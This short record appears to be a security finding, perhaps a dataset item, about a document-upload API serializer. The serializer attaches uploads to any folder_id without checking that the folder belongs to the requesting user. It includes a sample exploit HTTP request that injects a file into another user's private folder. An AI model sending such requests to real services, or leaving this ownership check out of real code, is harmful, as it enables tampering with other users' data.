diagnosis: The serializer accepts folder_id in validated_data and attaches the new document to the retrieved Folder without verifying that the folder belongs to self.context['request'].user. This allows an attacker to inject files into other users' private folders.
exploit_request:
POST /api/documents/upload/ HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"title": "Confidential Exfiltration", "file": "base64...", "folder_id": 512}
